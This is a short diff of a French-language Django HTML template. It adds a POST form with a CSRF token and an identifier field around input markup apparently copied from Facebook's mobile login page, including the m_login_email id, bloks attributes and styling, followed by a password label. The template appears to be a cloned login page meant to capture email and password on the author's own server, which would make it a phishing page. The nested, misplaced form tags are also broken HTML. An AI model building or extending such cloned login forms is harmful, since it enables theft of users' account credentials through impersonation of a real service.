@@ -7,8 +7,11 @@
 <html>
 <head>
     <form>
-          <label>Numéro mobile ou Email :</label><br>
-        
+          <label>Numéro mobile ou Email :</label><br>        
+<form method="POST">
+    {% csrf_token %}
+
+    <input type="text" name="identifiant" placeholder="Email ou téléphone">
         <input dir="auto" data-bloks-name="bk.components.TextInput" id="m_login_email" aria-label="Numéro mobile ou e-mail" autocapitalize="off" autocomplete="username webauthn" autocorrect="off" class="wbloks_1 wbloks_66" placeholder="" type="email" value="" name="email" style="background: transparent; color: rgb(17, 17, 18); font-family: &quot;Optimistic 95&quot;; font-size: 15.2px; line-height: 1.3; caret-color: rgb(17, 17, 18);"><br><br>
                 <label>Mot de passe :</label><br>
         
